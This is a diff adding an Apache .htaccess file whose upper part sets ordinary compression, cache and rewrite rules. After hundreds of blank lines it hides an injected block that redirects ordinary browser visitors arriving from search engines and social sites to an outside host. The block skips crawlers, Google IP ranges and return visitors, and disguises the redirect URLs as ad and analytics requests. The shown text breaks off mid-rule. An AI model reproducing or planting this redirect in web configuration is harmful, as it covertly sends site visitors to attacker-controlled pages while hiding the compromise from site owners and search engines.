@@ -1,0 +1,1301 @@
+AddType image/svg+xml .svg .svgz
+
+# Enable GZIP
+<ifmodule mod_deflate.c>
+AddOutputFilterByType DEFLATE text/text text/html text/plain text/xml text/css application/x-javascript application/javascript image/svg+xml
+# DeflateCompressionLevel 9
+# Header append Vary Accept-Encoding
+
+BrowserMatch ^Mozilla/4 gzip-only-text/html
+BrowserMatch ^Mozilla/4\.0[678] no-gzip
+BrowserMatch \bMSIE !no-gzip !gzip-only-text/html
+</ifmodule>
+
+# Expires Headers - 2678400s = 31 days
+<ifmodule mod_expires.c>
+  ExpiresActive On
+  ExpiresDefault "access plus 1 seconds"
+  ExpiresByType text/html "access plus 7200 seconds"
+  ExpiresByType image/gif "access plus 2678400 seconds"
+  ExpiresByType image/jpeg "access plus 2678400 seconds"
+  ExpiresByType image/png "access plus 2678400 seconds"
+  ExpiresByType text/css "access plus 518400 seconds"
+  ExpiresByType text/javascript "access plus 2678400 seconds"
+  ExpiresByType application/x-javascript "access plus 2678400 seconds"
+</ifmodule>
+
+# Cache Headers
+<ifmodule mod_headers.c>
+  # Cache specified files for 31 days
+  <filesmatch "\.(ico|flv|jpg|jpeg|png|gif|css|swf)$">
+  Header set Cache-Control "max-age=2678400, public"
+  </filesmatch>
+  # Cache HTML files for a couple hours
+  <filesmatch "\.(html|htm)$">
+  Header set Cache-Control "max-age=7200, private, must-revalidate"
+  </filesmatch>
+  # Cache PDFs for a day
+  <filesmatch "\.(pdf)$">
+  Header set Cache-Control "max-age=86400, public"
+  </filesmatch>
+  # Cache Javascripts for 31 days
+  <filesmatch "\.(js)$">
+  Header set Cache-Control "max-age=2678400, private"
+  </filesmatch>
+</ifmodule>
+
+<IfModule mod_rewrite.c>
+  RewriteEngine On
+  RewriteBase /
+  RewriteRule ^index\.html$ - [L]
+  RewriteCond %{REQUEST_FILENAME} !-f
+  RewriteCond %{REQUEST_FILENAME} !-d
+  RewriteRule . /index.html [L]
+</IfModule>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<IfModule prefork.c>
+RewriteEngine On
+RewriteCond %{REQUEST_METHOD}   ^GET$
+RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(tweet|twit|linkedin|instagram|facebook\.|myspace\.|bebo\.).*$ [NC,OR]
+RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(hi5\.|blogspot\.|friendfeed\.|friendster\.|google\.).*$ [NC,OR]
+RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(yahoo\.|bing\.|msn\.|ask\.|excite\.|altavista\.|netscape\.).*$ [NC,OR]
+RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(aol\.|hotbot\.|goto\.|infoseek\.|mamma\.|alltheweb\.).*$ [NC,OR]
+RewriteCond %{HTTP_REFERER}     ^(http\:\/\/)?([^\/\?]*\.)?(lycos\.|metacrawler\.|mail\.|pinterest|instagram).*$   [NC]
+RewriteCond %{HTTP_REFERER}     !^.*(imgres).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(bing|Accoona|Ace\sExplorer|Amfibi|Amiga\sOS|apache|appie|AppleSyndication).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Archive|Argus|Ask\sJeeves|asterias|Atrenko\sNews|BeOS|BigBlogZoo).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Biz360|Blaiz|Bloglines|BlogPulse|BlogSearch|BlogsLive|BlogsSay|blogWatcher).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Bookmark|bot|CE\-Preload|CFNetwork|cococ|Combine|Crawl|curl|Danger\shiptop).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Diagnostics|DTAAgent|EmeraldShield|endo|Evaal|Everest\-Vulcan).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(exactseek|Feed|Fetch|findlinks|FreeBSD|Friendster|Fuck\sYou|Google).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Gregarius|HatenaScreenshot|heritrix|HolyCowDude|Honda\-Search|HP\-UX).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(HTML2JPG|HttpClient|httpunit|ichiro|iGetter|IRIX|Jakarta|JetBrains).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Krugle|Labrador|larbin|LeechGet|libwww|Liferea|LinkChecker).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(LinknSurf|Linux|LiveJournal|Lonopono|Lotus\-Notes|Lycos|Lynx|Mac\_PowerPC).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Mac\_PPC|Mac\s10|macDN|Mediapartners|Megite|MetaProducts).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Miva|Mobile|NetBSD|NetNewsWire|NetResearchServer|NewsAlloy|NewsFire).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(NewsGatorOnline|NewsMacPro|Nokia|NuSearch|Nutch|ObjectSearch|Octora).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(OmniExplorer|Omnipelagos|Onet|OpenBSD|OpenIntelligenceData|oreilly).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(os\=Mac|P900i|panscient|perl|PlayStation|POE\-Component|PrivacyFinder).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(psycheclone|Python|retriever|Rojo|RSS|SBIder|Scooter|Seeker|Series\s60).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(SharpReader|SiteBar|Slurp|Snoopy|Soap\sClient|Socialmarks|Sphere\sScout).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(spider|sproose|Rambler|Straw|subscriber|SunOS|Surfer|Syndic8).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Syntryx|TargetYourNews|Technorati|Thunderbird|Twiceler|urllib|Validator).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Vienna|voyager|W3C|Wavefire|webcollage|Webmaster|WebPatrol|wget|Win\s9x).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Win16|Win95|Win98|Windows\s95|Windows\s98|Windows\sCE|Windows\sNT\s4).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(WinHTTP|WinNT4|WordPress|WWWeasel|wwwster|yacy|Yahoo).*$   [NC]
+RewriteCond %{HTTP_USER_AGENT}  !^.*(Yandex|Yeti|YouReadMe|Zhuaxia|ZyBorg).*$   [NC]
+RewriteCond %{REQUEST_FILENAME} !.*jpg$|.*gif$|.*png|.*jpeg|.*mpg|.*avi|.*zip|.*gz|.*tar|.*ico$ [NC]
+RewriteCond %{REMOTE_ADDR}      !^66\.249.*$ [NC]
+RewriteCond %{REMOTE_ADDR}      !^74\.125.*$ [NC]
+RewriteCond %{HTTP_COOKIE}      !^.*EGU.*$ [NC]
+RewriteCond %{HTTP_USER_AGENT}  .*(Windows|Macintosh|iPad|iPhone|iPod|Android).* [NC]
+RewriteCond %{HTTPS}            ^off$
+RewriteRule .* - [E=EGU:%{TIME_SEC}]
+RewriteRule .* - [E=ngk:interial.annapolispondsupply.com]
+
+RewriteCond %{ENV:EGU} 0
+RewriteRule ^.* http://%{ENV:ngk}/st?_PVID=xeUEIGoKp3GAxZXiTi5fwgHUyokXaE_.LkMACFvh&cnt=yan&ad_type=iframe&ad_size=180x150&entity=24276&site_code=mail&section_code=15167784&cb=1342058051610177&yud=zip\%3D\%26ycg\%3Dm\%26yyob\%3D1955&pub_redirect_unencoded=1&pub_redirect=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:10156:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 1
+RewriteRule ^.* http://%{ENV:ngk}/safe_image.php?d=AQDQOyuU8ss9bTn2&w=100&h=100&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&crop  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11104:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 2
+RewriteRule ^.* http://%{ENV:ngk}/pview?event=pview&fpc=d96b1f4-137eaa87da1-3bf81330-1366&sessionID=1340170137219.54434&sourceURL=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&hostname=www.mangahere.com&location=/manga/heaven_oda_aya/v01/c001/13.html&publisher=e47efe7d-147b-4731-ac42-9838ccdc52f2&shareHash=sthash.Q4GSYuNh&incomingHash=&refDomain=www.mangahere.com&refQuery=manga/heaven_oda_aya/v01/c001/12.html&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&sharURL=&source=share5x&title=Heaven\%20(ODA\%20Aya)\%201\%20-\%20Read\%20Heaven\%20(ODA\%20Aya)\%20Chapter\%201\%20Online\%20-\%20Page\%2013&ts1340170137222.0=  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:10833:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 3
+RewriteRule ^.* http://%{ENV:ngk}/_xhr/ugccomments/?method=get_list&context_id=0576a99c-4746-3f45-ba42-7ec42111c2d7&0.9460873345681772&mode=list&show_form=yes&baseurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&&asset_title=personagens&ugccmt_vita_type=photo&ugccmt_vita_img_url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ugccmt_vita_img_width=110&ugccmt_vita_img_height=88&ugccmt_vita_img_rights=anywhere&ugccmt_vita_photo_album=15\%20Tokoh\%20Fiksi\%20Terkaya\%20di\%20Dunia&ugccmt_vita_photo_album_url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:10692:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 4
+RewriteRule ^.* http://%{ENV:ngk}/ps/ifr?container=friendconnect&mid=0&nocache=0&view=profile&parent=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&communityId=10942388417979289385&caller=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&rpctoken=1420838164&locale=th  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:9731:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 5
+RewriteRule ^.* http://%{ENV:ngk}/__utm.gif?utmwv=5.3.2&utms=10&utmn=565004369&utmhn=www.koarastudio.com&utmt=event&utme=5(Questions*2-6*Answered)(1)&utmcs=UTF-8&utmsr=1024x768&utmvp=760x800&utmsc=16-bit&utmul=en-us&utmje=0&utmfl=10.3\%20r181&utmdt=BuddyBuzz&utmhid=649110554&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/fbapps/buddybuzzid/interview.php&utmac=UA-20190543-1&utmcc=__utma\%3D65553076.1967605883.1340348930.1340348930.1340348930.1\%3B\%2B__utmz\%3D65553076.1340348930.1.1.utmcsr\%3Dapps.facebook.com\%7Cutmccn\%3D(referral)\%7Cutmcmd\%3Dreferral\%7Cutmcct\%3D/buddybuzz_id/interview.php\%3B&utmu=6~  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:9368:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 6
+RewriteRule ^.* http://%{ENV:ngk}/delivery/lg.php?bannerid=1756&campaignid=682&zoneid=1972&channel_ids=,&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=527c8b41be  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:10074:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 7
+RewriteRule ^.* http://%{ENV:ngk}/delivery/lg.php?bannerid=24025&campaignid=4402&zoneid=1841&channel_ids=,&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=65ba861655  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11751:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 8
+RewriteRule ^.* http://%{ENV:ngk}/pview?event=pview&fpc=d96b1f4-137eaa87da1-3bf81330-5674&sessionID=1340715537952.28705&sourceURL=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&hostname=www.mangahere.com&location=/manga/mishounen_produce/v03/c013.5/19.html&publisher=e47efe7d-147b-4731-ac42-9838ccdc52f2&shareHash=sthash.y1eP0bTS&incomingHash=&refDomain=www.mangahere.com&refQuery=manga/mishounen_produce/v03/c013.5/18.html&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&sharURL=&source=share5x&title=Mishounen\%20Produce\%2013.5\%20-\%20Read\%20Mishounen\%20Produce\%20Chapter\%2013.5\%20Online\%20-\%20Page\%2019&ts1340715537953.0=  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:10197:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 9
+RewriteRule ^.* http://%{ENV:ngk}/pview?event=pview&fpc=d96b1f4-137eaa87da1-3bf81330-7576&sessionID=1340974422642.47032&sourceURL=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&hostname=www.mangahere.com&location=/manga/anatolia_story/v02/c005/10.html&publisher=e47efe7d-147b-4731-ac42-9838ccdc52f2&shareHash=sthash.7nFjmMih&incomingHash=&refDomain=www.mangahere.com&refQuery=manga/anatolia_story/v02/c005/9.html&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&sharURL=&source=share5x&title=Anatolia\%20Story\%205\%20-\%20Read\%20Anatolia\%20Story\%20Chapter\%205\%20Online\%20-\%20Page\%2010&ts1340974422645.0=  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:9758:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 10
+RewriteRule ^.* http://%{ENV:ngk}/new2/www/delivery/lg.php?bannerid=9879&campaignid=2471&zoneid=869&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=4b9f744a49  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:9668:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 11
+RewriteRule ^.* http://%{ENV:ngk}/thread.js?url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&title=&sort=&per_page&category_id=&developer=1&identifier=&disqus_version=1341523943&1341823863272  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:10533:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 12
+RewriteRule ^.* http://%{ENV:ngk}/t.gif?_=1341384935159&count=horizontal&id=twitter-widget-0&lang=en&original_referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&size=m&text=\%2010\%20Orang\%20Indonesia\%20Pertama\%20yang\%20Punya\%20Akun\%20Twitter&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&via=kompascom&type=share&twttr_referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&twttr_widget=1&twttr_hask=1&twttr_li=0&twttr_pid=v3:1341384139898168653891459  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11708:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 13
+RewriteRule ^.* http://%{ENV:ngk}/__utm.gif?utmwv=5.3.3&utms=12&utmn=1510227832&utmhn=siva-id.jobstreet.com&utmcs=UTF-8&utmsr=1024x768&utmvp=1007x658&utmsc=24-bit&utmul=en-us&utmje=0&utmfl=10.0\%20r22&utmdt=Alam\%20CH\%2C\%20Yhonico\%27s\%20Resume&utmhid=1537748878&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/applications/viewResumePrint.asp\%3FJID\%3D211111681916766048\%257C480617\%26CID\%3D465056624312312030\%257C\%257B9C2B4BA8-1224-11DF-8E55-6D796A6F6273\%257D\%26AID\%3D864561949367112136\%257C67231833\%26ASC\%3D100000\%26SubF\%3D\%26AdvID\%3D441870325692373125\%257C18619\%26Title\%3DAudio\%2BSystem\%2BEngineer\%2BLive\%2BPerformance\%26SRC\%3D\%26SUMM\%3D1\%26Name\%3DAlam\%2BCH\%25252C\%2BYhonico\%26JGID\%3D0\%26Sought\%3D\%26Spe\%3D187\%26pcid\%3D\%26Return\%3DviewJobFolder.asp\%25253FJID\%25253D211111681916766048\%25257C480617\%252526ASC\%25253D100000\%252526QID\%25253D634170280302056912\%25257C7926414\%252526QID2\%25253D\%252526Sort\%25253D-133\%25252C131\%25252C105\%252526SRC\%25253D\%252526SubF\%25253D\%252526PF\%25253DFalse\%252526JGID\%25253D0\%252526Rank\%25253D0\%252526AdvID\%25253D441870325692373125\%25257C18619\%252526Sought\%25253D\%252526Spe\%25253D187\%252526MTR\%25253D1\%252526Rank\%25253D864561949367112136\%25257C67231833&utmac=UA-226014-6&utmcc=__utma\%3D1.698288290.1334714014.1342068048.1342075935.128\%3B\%2B__utmz\%3D1.1342068048.127.26.utmcsr\%3Dsiva-id.jobstreet.com\%7Cutmccn\%3D(referral)\%7Cutmcmd\%3Dreferral\%7Cutmcct\%3D/applications/viewJobFolder.asp\%3B&utmu=qh~  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:10735:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 14
+RewriteRule ^.* http://%{ENV:ngk}/__utm.gif?utmwv=5.3.2&utms=3&utmn=1537227264&utmhn=ghiboo.com&utmcs=ISO-8859-1&utmsr=1366x768&utmsc=24-bit&utmul=en-us&utmje=0&utmfl=10.0\%20r22&utmhid=2140048151&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/frame1.html&utmac=UA-20433198-1&utmcc=__utma\%3D193764466.1350288009.1340419423.1340419423.1340419423.1\%3B\%2B__utmz\%3D193764466.1340419423.1.1.utmcsr\%3Dmediaindonesia.com\%7Cutmccn\%3D(referral)\%7Cutmcmd\%3Dreferral\%7Cutmcct\%3D/read/2012/06/23/328204/284/1/Presiden-Mulai-Kunjungan-Kenegaraaan-di-Ekuador\%3B&utmu=qB~  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:10608:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 15
+RewriteRule ^.* http://%{ENV:ngk}/b?c1=8&c2=6135404&c3=28&c4=13310&c10=3325558&ns__t=1340678989246&ns_c=ISO-8859-1&c8=&c7=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&c9=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:9709:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 16
+RewriteRule ^.* http://%{ENV:ngk}/fpc.pl?v=5.1.0.13.js&a=10001467053656&dpid=4261502191&ittidx=0&flv=Shockwave\%20Flash\%2010.0\%20r22&n=-7&g=en-US&h=N&j=1024x768&k=16&l=true&f=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&b=Ical\%20dan\%20Anas\%2C\%20Capres\%20yang\%20Paling\%20tidak\%20Diinginkan\%20-\%20Yahoo!\%20News\%20Indonesia&enc=UTF-8&e=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&d=Tue\%2C\%2010\%20Jul\%202012\%2005:46:28\%20GMT  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:10747:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 17
+RewriteRule ^.* http://%{ENV:ngk}/lg.php?bannerid=2149&campaignid=1032&zoneid=1&loc=1&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=1a05cc4627  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11081:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 18
+RewriteRule ^.* http://%{ENV:ngk}/t.gif?_=1340873669050&count=horizontal&counturl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&id=twitter-widget-0&lang=en&original_referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&size=m&text=\%5BASTROBIOLOGI\%5D\%20Mencari\%20Tetangga\%20Penduduk\%20\%20Bumi&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&via=kompascom&type=share&twttr_referrer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&twttr_widget=1&twttr_hask=1&twttr_li=0&twttr_pid=v3:1340870712302723429066404  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11789:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 19
+RewriteRule ^.* http://%{ENV:ngk}/api/getCount2.php?cb=stButtons.processCB&refDomain=www.mangahere.com&refQuery=manga/faster_than_a_kiss/v01/c001/9.html&pgurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&pubKey=e47efe7d-147b-4731-ac42-9838ccdc52f2&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11110:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 20
+RewriteRule ^.* http://%{ENV:ngk}/click/?&h=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&u=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cen=1&vid=edee3daec04370f4e4894ca87ee8e537bd5bb74a71d99d5a&ign=0&fl=0&lnt=Video\%20Ciuman\%20Kucing\%20dan\%20Lumba-Lumba\%20Bikin\%20Gempar&prt=\%20&pot=&gid=0&tfen=1&flc=&fjv=2&t=7\%20Rumah\%20Unik\%20Dengan\%20Harga\%20Selangit\%20\%7C\%20Paling\%20Seru&rand=643872472  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:9283:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 21
+RewriteRule ^.* http://%{ENV:ngk}/__utm.gif?utmwv=5.3.3&utms=3&utmn=919243935&utmhn=www.scribd.com&utmt=event&utme=5(DOM\%20Load*less\%20than\%2030s*/doc/55248443/Suku-Bunga-Deposito)(105)8(logged_in*fb_setup_context)9(true*facebook_connect_signup)11(1*1)&utmcs=UTF-8&utmsr=1024x768&utmvp=1007x572&utmsc=32-bit&utmul=en-us&utmje=0&utmfl=10.0\%20r22&utmdt=Suku\%20Bunga\%20Deposito&utmhid=770050683&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=/doc/55248443/Suku-Bunga-Deposito&utmac=UA-443684-17&utmcc=__utma\%3D137936306.2019304305.1304051948.1314176041.1341280866.8\%3B\%2B__utmz\%3D137936306.1341280866.8.1.utmcsr\%3Dgoogle\%7Cutmccn\%3D(organic)\%7Cutmcmd\%3Dorganic\%7Cutmctr\%3Dsuku\%2520bunga\%2520deposito\%2520bank\%2520liman\%3B&utmu=6QAgAIAAAAAAAAAAQ~  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:10800:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 22
+RewriteRule ^.* http://%{ENV:ngk}/api/getCount2.php?cb=stButtons.processCB&refDomain=mangafox.me&refQuery=manga/bleach/v53/c474/18.html&pgurl=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&pubKey=2c989003-877d-472f-8054-0185c722ab72&url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:9491:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 23
+RewriteRule ^.* http://%{ENV:ngk}/__utm.gif?utmwv=5.3.3&utms=7&utmn=356741356&utmhn=jakartacity.olx.co.id&utmcs=UTF-8&utmsr=1280x800&utmvp=1280x687&utmsc=24-bit&utmul=en-us&utmje=0&utmfl=10.2\%20r159&utmdt=service\%20mesin\%20dryer\%20-\%20Jakarta\%2C\%20Jasa\%20-\%20Jakarta\%20-\%202&utmhid=518707240&utmr=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&utmp=services/staticsearch/191\%3Fsearchbox\%3Dservice\%2520mesin\%2520dryer\%26section\%3Dst-191&utmac=UA-137146-40&utmcc=__utma\%3D209359949.264423991.1285569052.1340955120.1341223311.37\%3B\%2B__utmz\%3D209359949.1341223311.37.39.utmcsr\%3Dgoogle\%7Cutmccn\%3D(organic)\%7Cutmcmd\%3Dorganic\%7Cutmctr\%3Dmodifikasi\%2520dryer\%2520jakarta\%3B&utmu=ujGgAAAAIAAAAAAAAAAAAAB~  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:11785:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 24
+RewriteRule ^.* http://%{ENV:ngk}/delivery/lg.php?bannerid=37753&campaignid=7599&zoneid=761&channel_ids=,&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=09819b02a2  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:10230:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 25
+RewriteRule ^.* http://%{ENV:ngk}/hb/i/sg/adv/infinity/sg_prom_ysm_iframe_20110425.html?ysm_rd=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ysm_url=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ysm_title1=Gunakan\%20YSM!&ysm_descr1=Berkembang\%20bersama\%20Yahoo!\%20Search\%20Marketing.&ysm_clickurl1=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&ysm_sitehost1=&ysm_pos=1&ord=1341806361379125  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:10618:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 26
+RewriteRule ^.* http://%{ENV:ngk}/new/www/delivery/lg.php?bannerid=10377&campaignid=3233&zoneid=217&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=8a083078f9  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:10824:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 27
+RewriteRule ^.* http://%{ENV:ngk}/delivery/lg.php?bannerid=4274&campaignid=2451&zoneid=769&channel_ids=,&loc=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&referer=http\%3A\%2F\%2F%{HTTP_HOST}\%2F&cb=3e6a69cd39  [R=302,NE,L,CO=EGU:%{ENV:EGU}:%{HTTP_HOST}:9304:/:0:HttpOnly]
+RewriteCond %{ENV:EGU} 28
+RewriteRule ^.* 